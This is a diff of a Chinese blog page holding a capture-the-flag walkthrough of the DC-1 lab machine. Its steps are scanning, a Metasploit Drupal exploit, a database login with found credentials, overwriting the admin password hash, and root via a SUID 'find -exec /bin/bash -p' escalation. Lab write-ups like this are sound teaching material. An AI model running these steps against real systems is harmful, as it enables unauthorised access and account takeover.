@@ -52,166 +52,85 @@
     <h1>DC-1</h1>
     <div class="post-meta">
       <time datetime="2026-06-20T11:07:54.000Z">2026.06.20</time>
-      <span>10 分钟阅读</span>
+      <span>4 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# DC-1
-
-1.打开kali跟DC-1，设置NAT模式
-
-2.nmap -sn 192.168.243.0/24扫描得到DC-1的IP192.168.243.131
-
-![image-20251119103604928](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119103604928.png)
-
-3.nmap -sT -v 192.168.243.131扫描开放端口得到ssh,http,rpcbind
-
-![image-20251119103738338](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119103738338.png)
-
-4.访问192.168.243.131，通过wappalyzer得到网站详细信息
-
-![image-20251119104204878](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119104204878.png)
-
-5.msfconsole  进入MSF控制台
-
-6.search drupa  搜索drupa模块
-
-![image-20251119152730323](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119152730323.png)
-
-7.use 1  使用2018的模块
-
-![image-20251119153859277](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119153859277.png)
-
-8.show options   查看要配置的参数
-
-![](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119155328681.png)
-
-9.set RHOSTS 192.168.243.131  填写靶机IP地址
-
-run  执行攻击
-
-![image-20251119155938450](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119155938450.png)
-
-10.shell  进入shell
-
-whoami  查看用户名
-
-id 查看id
-
-![image-20251119161757378](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119161757378.png)
-
-11.ls 查看当前目录文件，发现flag1.txt
-
-![image-20251119162435238](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119162435238.png)
-
-12.cat flag.txt  查看文件发现需要配置文件
-
-![image-20251119210842564](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119210842564.png)
-
-13.python -c "import pty; pty.spawn('/bin/bash');"   一行代码生成交互终端,如果目标主机有python
-
-![image-20251120001036792](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120001036792.png)
-
-14.ls  查看当前目录下的文件，找到setings.php
-
-cat setting.php 查看文件发现flag2
-
-![image-20251120001151213](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120001151213.png)
-
-![image-20251120001341966](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120001341966.png)
-
-15.flag2：Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access).
-
-What can you do with these credentials?
-
-暴力破解和字典攻击并非获取访问权限的唯一途径（而你确实需要访问权限）。
-
-拥有这些凭证后你能做什么？
-
-mysql -udbuser -pR0ck3t  登录数据库
-
-show databases; 查看数据库
-
-![image-20251120002637864](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120002637864.png)
-
-16.use drupaldb；  选中数据库
-
-show tables； 查看表，发现有个user表
-
-![image-20251120003019002](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120003019002.png)
-
-17.select * from users\G； 垂直显示users表或
-
-desc users 只查看表结构
-
-![image-20251120004436997](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120004436997.png)
-
-找到admin 信息
-
-18.find . -name \*password\*   在根目录下查找一下相关文件 
-
-![image-20251120010226431](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120010226431.png)
-
-19.cat ./scripts/password-hash.sh  查看文件，这应该是个密码生成器
-
-![image-20251120011843476](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120011843476.png)
-
-20.php ./scripts/password-hash-sh "123"  使用该密码生成器生成一个密码
-
-![image-20251120012057018](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120012057018.png)
-
-21.update users set pass="$S$DKIKsrwi2eln3ts6yQJ.Wii1CnmjiBwyrxd8hAsLw/bZvWkyYmHE" where name="admin";用刚生成的密码更新admin的密码
-
-![image-20251120013546170](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120013546170.png)
-
-22.登录网站
-
-![image-20251120013804951](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120013804951.png)
-
-23.在Dashboard中发现flag3
-
-Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
-
-24.cat /etc/passwd  查看一下passwd文件，发现有flag4这个用户
-
-![image-20251120014910157](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120014910157.png)
-
-25.cd /home/flag4  cd到flag4家目录下
-
-ls  发现有flag4.txt文件
-
-26.cat flag4.txt  查看flag4.txt文件，发现in root中
-
-![image-20251120015340514](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120015340514.png)
-
-27.cd /home/root  进入root目录,发现没有权限
-
-![image-20251120015658257](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120015658257.png)
-
-28.find / -perm -4000 2>/dev/null  查找哪些文件具有SUID标识
-
-![image-20251120201055939](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120201055939.png)
-
-可以使用find命令来提权
-
-29.find cron.php -exec /bin/bash -p \;  使用该目录下随便一个文件提权
-
-![image-20251120223033688](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120223033688.png)
-
-得到root权限
-
-30.pwd  查看当前路径
-
-ls 列举目录下的文件/文件夹
-
-cat thefinalflag.txt  查看最终flag
-
-![image-20251120223721812](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120223721812.png)
-
-
-
-
+    <h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>1.打开kali跟DC-1，设置NAT模式</p>
+<p>2.nmap -sn 192.168.243.0&#x2F;24扫描得到DC-1的IP192.168.243.131</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119103604928.png" alt="image-20251119103604928"></p>
+<p>3.nmap -sT -v 192.168.243.131扫描开放端口得到ssh,http,rpcbind</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119103738338.png" alt="image-20251119103738338"></p>
+<p>4.访问192.168.243.131，通过wappalyzer得到网站详细信息</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119104204878.png" alt="image-20251119104204878"></p>
+<p>5.msfconsole  进入MSF控制台</p>
+<p>6.search drupa  搜索drupa模块</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119152730323.png" alt="image-20251119152730323"></p>
+<p>7.use 1  使用2018的模块</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119153859277.png" alt="image-20251119153859277"></p>
+<p>8.show options   查看要配置的参数</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119155328681.png"></p>
+<p>9.set RHOSTS 192.168.243.131  填写靶机IP地址</p>
+<p>run  执行攻击</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119155938450.png" alt="image-20251119155938450"></p>
+<p>10.shell  进入shell</p>
+<p>whoami  查看用户名</p>
+<p>id 查看id</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119161757378.png" alt="image-20251119161757378"></p>
+<p>11.ls 查看当前目录文件，发现flag1.txt</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119162435238.png" alt="image-20251119162435238"></p>
+<p>12.cat flag.txt  查看文件发现需要配置文件</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251119210842564.png" alt="image-20251119210842564"></p>
+<p>13.python -c “import pty; pty.spawn(‘&#x2F;bin&#x2F;bash’);”   一行代码生成交互终端,如果目标主机有python</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120001036792.png" alt="image-20251120001036792"></p>
+<p>14.ls  查看当前目录下的文件，找到setings.php</p>
+<p>cat setting.php 查看文件发现flag2</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120001151213.png" alt="image-20251120001151213"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120001341966.png" alt="image-20251120001341966"></p>
+<p>15.flag2：Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access).</p>
+<p>What can you do with these credentials?</p>
+<p>暴力破解和字典攻击并非获取访问权限的唯一途径（而你确实需要访问权限）。</p>
+<p>拥有这些凭证后你能做什么？</p>
+<p>mysql -udbuser -pR0ck3t  登录数据库</p>
+<p>show databases; 查看数据库</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120002637864.png" alt="image-20251120002637864"></p>
+<p>16.use drupaldb；  选中数据库</p>
+<p>show tables； 查看表，发现有个user表</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120003019002.png" alt="image-20251120003019002"></p>
+<p>17.select * from users\G； 垂直显示users表或</p>
+<p>desc users 只查看表结构</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120004436997.png" alt="image-20251120004436997"></p>
+<p>找到admin 信息</p>
+<p>18.find . -name *password*   在根目录下查找一下相关文件 </p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120010226431.png" alt="image-20251120010226431"></p>
+<p>19.cat .&#x2F;scripts&#x2F;password-hash.sh  查看文件，这应该是个密码生成器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120011843476.png" alt="image-20251120011843476"></p>
+<p>20.php .&#x2F;scripts&#x2F;password-hash-sh “123”  使用该密码生成器生成一个密码</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120012057018.png" alt="image-20251120012057018"></p>
+<p>21.update users set pass&#x3D;”$S$DKIKsrwi2eln3ts6yQJ.Wii1CnmjiBwyrxd8hAsLw&#x2F;bZvWkyYmHE” where name&#x3D;”admin”;用刚生成的密码更新admin的密码</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120013546170.png" alt="image-20251120013546170"></p>
+<p>22.登录网站</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120013804951.png" alt="image-20251120013804951"></p>
+<p>23.在Dashboard中发现flag3</p>
+<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+<p>24.cat &#x2F;etc&#x2F;passwd  查看一下passwd文件，发现有flag4这个用户</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120014910157.png" alt="image-20251120014910157"></p>
+<p>25.cd &#x2F;home&#x2F;flag4  cd到flag4家目录下</p>
+<p>ls  发现有flag4.txt文件</p>
+<p>26.cat flag4.txt  查看flag4.txt文件，发现in root中</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120015340514.png" alt="image-20251120015340514"></p>
+<p>27.cd &#x2F;home&#x2F;root  进入root目录,发现没有权限</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120015658257.png" alt="image-20251120015658257"></p>
+<p>28.find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null  查找哪些文件具有SUID标识</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120201055939.png" alt="image-20251120201055939"></p>
+<p>可以使用find命令来提权</p>
+<p>29.find cron.php -exec &#x2F;bin&#x2F;bash -p ;  使用该目录下随便一个文件提权</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120223033688.png" alt="image-20251120223033688"></p>
+<p>得到root权限</p>
+<p>30.pwd  查看当前路径</p>
+<p>ls 列举目录下的文件&#x2F;文件夹</p>
+<p>cat thefinalflag.txt  查看最终flag</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251120223721812.png" alt="image-20251120223721812"></p>
 
   </div>
 </article>
